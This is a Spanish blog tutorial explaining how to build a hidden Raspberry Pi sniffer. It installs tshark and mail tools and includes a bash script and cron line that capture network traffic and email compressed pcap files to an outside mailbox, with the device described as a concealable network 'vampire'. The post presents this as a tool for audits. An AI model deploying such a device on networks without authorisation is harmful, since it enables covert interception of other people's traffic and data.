aspberry Sniffing: El juguete oculto
octubre 29, 2014 / Manuel Camacho / No comments
Tras un par de semanas bastante ajetreadas volvemos para ofreceros un nuevo artículo en nuestro blog. Antes de nada quisiéramos dar las gracias desde el equipo de hacking-etico.com a todos los visitantes que día tras día pasan por nuestro blog. También a aquellos que nos han votado pues valoramos enormemente sus votaciones hacia nuestro blog ya que “competimos” (de forma sana) entre autores y sitios que llevan más tiempo publicando y ni que decir tiene, la enorme calidad y profesionalidad de éstos.

Si aún no nos has votado y te gusta nuestro blog, puedes hacerlo desde aquí: VOTAR

Hoy traemos un artículo un poco distinto a lo habitual. Raspberry Sniffing: El juguete oculto.

Explicaremos cómo configurar una Raspberry Pi para insertarla en una red y que capture paquetes y envíe los ficheros de captura por correo. Queremos que os quedéis con la idea, y a partir de ahí podéis desarrollarla a vuestro placer. Trataremos de hacer ver que es muy posible para ayudaros a controlar una red haciéndole capturas de paquetes o para una pequeña auditoría.

rasp


El proceso no es complejo. Partiremos de la base de que tenemos instalado Raspbian (distribución para Raspberry basada en Debian) y que accedemos mediante SSH (también nos vale conectar la raspberry a un monitor y al teclado) ya que sino este artículo se extendería hasta límites insospechados.

Esto nos vale para por ejemplo en pequeñas auditorías “in site” tras dejar enchufada una raspberry (o varias) a los armarios de red y ser pacientes. Hay que decir que se deben de cumplir determinados parámetros, como que tengamos salida a internet desde el punto de conexión pero igualmente podemos dejar la raspberry configurada para que sólo “chupe” paquetes.pee0k6uz

El primer paso que nosotros vamos a realizar es configurar el envío de correo. Para ello vamos a instalar diversos paquetes. La sintaxis es la siguiente:

sudo apt-get install ssmtp mailutils mpack

Comentar que mpack es la aplicación que nos servirá para adjuntar ficheros a los correos.
A continuación y tras una leve espera, procedemos a configurar el servidor SMTP de salida. Veámos:

sudo nano /etc/ssmtp/ssmtp.conf

Veremos campos ya incluídos pero completando lo siguiente tendremos más que suficiente para tener operativo nuestro servicio mail.

AuthUser=tucorreoelectronico@gmail.com
AuthPass=contraseñadetucuenta
FromLineOverride=YES
mailhub=smtp.gmail.com:587
UseSTARTTLS=YES

Si usas otro servicio, cambia mailhub por los datos de tu proveedor de correo.

Probando envío de correo y envío de ficheros

Ahora vamos a ver si realmente nos funciona lo anteriormente configurado. Para ello vamos a mandar el siguiente comando:

echo “Probando el envío de correo” | mail -s “Aquí va el Asunto” micorreo@hotmail.com

Lo que hacemos es pasar mediante “echo” el texto del correo junto con “-s” que es el Asunto a la dirección indicada.

Si no tenemos ningún fallo nos llegará a nuestra bandeja de entrada el correo. En la consola simplemente nos saltará a otra línea de comandos.

Aquí mostramos errores típicos de una mala configuración por error de servidores smtp o contraseña.

ErroresMalaConfiig

Si os aparece así, es que os falla algo del login de vuestra configuración de correo o smtp como hemos comentado antes. En cambio si todo está correcto solamente ejecutando las líneas de abajo nos saltará a otra línea.

correoOKnamerasp1

Ahora nos queda probar si “mpack” funciona. Debe de funcionar si la anterior función nos ha enviado el correo. Vamos a probarlo con la siguiente línea:

mpack -s “test” /ruta/donde/tengo/fichero/fichero.txt micorreo@hotmail.com

Vamos a crear un fichero de prueba alojado en el directorio /tmp/ para hacer unos test, simplemente con el comando siguiente abrirmos un editor (nano):

sudo nano /tmp/hacking-etico.txt

Guardamos con CTRL+O y salimos con CTRL+X.

¿Cómo sería la sintaxis de envío de este correo?

mpack -s “test” /tmp/hacking-etico.txt micorreo@hotmail.com

Recibiremos un correo con el fichero en cuestión. Aclarar que hay que sustituir “micorreo@hotmail.com” por el correo donde queramos que nos llegue el txt creado anteriormente.

Con esto ya tenemos la primera parte solucionada. Tenemos operativo en nuestra pequeña raspberry el envío de correo. Ahora toca configurar nuestro sniffer.

Hemos elegido tshark por su ligereza pero igualmente es válido cualquier otro. Para instalarlo escribimos lo siguiente:

sudo apt-get install tshark

Y en pocos minutos tendremos también el sniffer listo para usarse.

La sintaxis de prueba que vamos a emplear es:

tshark -nni eth0 -a filesize:20 -a files:3 -w nombrefichero.pcap

Esto significa que lanzaremos el tshark para que haga 3 archivos de 20Kbs cada uno. Podremos aumentarlo lo que queramos. Hemos cogido un tamaño ínfimo solo para hacer las pruebas y debido a que vamos a enviarlo por correo no nos conviene que sean tamaños excesivamente grandes.

El parámetro “-a” nos da la opción de jugar con el tamaño, y el nombre de fichero de ahí su elección.

Ojo, seguramente nos dé un error con “init.lua” y no inicialice.

errorlua

Para corregir esto, debemos editar tal fichero.

sudo nano /usr/share/wireshark/init.lua

Y cambiar el valor de la línea “disable_lua = false” por “disable_lua = true”. Hecho esto ya podremos inicializar tshark (con sudo delante).

disable

Con esto podemos ya podremos generar un script en bash para lanzarlo todo a la vez. Para rizar el rizo podemos añadirlo al crontab para que se ejecute cuando y como queramos automatizando así la tarea.

El script puede ser algo similar a esto (perdonad pero no había mucho tiempo):

#!/bin/sh
if [ "$(ping -w 5 google.com)" == "$ping: unknown host google.com" ]; then
echo “>No hay salida a Internet”
tshark -nni eth0 -a filesize:2 -a files:1 -w /tmp/capturas/1234.pcap
echo ” Capturas ejecutadas”
else
echo “>Hay salida a Internet”
tshark -nni eth0 -a filesize:200 -a files:1 -w /tmp/capturas/hackingetico.pcap
echo “Esperando 5 segundos” sleep 5;
tar -zcvf raspberry.tar.gz /tmp/capturas/
sleep 5s;
mpack -s “Capturas PCAP” /tmp/raspberry.tar.gz micorreo@hotmail.com
echo “Correo enviado”
fi

Lo que hace básicamente es ver si tiene acceso a Internet. si no lo tiene solamente guardará el fichero en el directorio indicado (Que previamente lo habremos creado). Si tiene acceso a Internet, realiza lo mismo pero con nombre distinto, lo comprime y lo envía por correo a la dirección micorreo@hotmail.com.

Recordad dar permisos de ejecución al script sino no podréis ejecutarlo. Basta con ejecutar:

sudo chmod +x script.sh

Para ejecutarlo:

sudo ./script.sh

Tras unos instantes en nuestro caso( debido al poco tamaño y un sólo fichero) nos debe de llegar este correo a la bandeja de entrada. Contendrá un fichero comprimido con los archivos generados.

correo1

En la imagen de abajo vemos que contiene el fichero comprimido en tar.gz. Dos pcap que estaban almacenados en /tmp/capturas.

capturas

Con esto tendremos automatizado una parte del sniffing. Como hemos dicho, podemos configurar un crontab para tener una ejecución automática a la hora que queramos que nuestro juguete se active y mande información.

Por ejemplo añadiremos una línea al crontab

30 08 * * * root /tmp/scriptsniffing.sh
Se ejecutaría nuestro script que está situado en la ruta /tmp todos los días a las 08:30. Recordad que debe tener permisos de ejecución el script.

Esto puede ser una pequeña utilidad para automatizar el escaneo de una red. Se puede afinar los parámetros de tshark según nos interese. Los pcap pueden ser interpretados con herramientas como NetWorkMiner en su versión Pro o HighLighter de Mandiant.

La intención de este artículo es dar una idea de que puede hacerse con un pequeño aparatito que puede ser “ocultado” en cualquier recoveco a modo de “vampiro” de red y mandar (si fuera posible el acceso a Internet) información a un correo.

Bueno, espero que os haya gustado y disculpéis si se me ha pasado algo ya que el tiempo de prueba/redacción es más bien escaso.

Un saludo, “hackmigos”!!

@ManoloGaritmo


A
A
Ai
A
A
A
A
A
A
B
B
B
B
B
B
A
A
A
A
A
A
A
A
A
- See more at: http://hacking-etico.com/2014/10/29/raspberry-sniffing-el-juguete-oculto/#sthash.REDRjfnD.dpuf
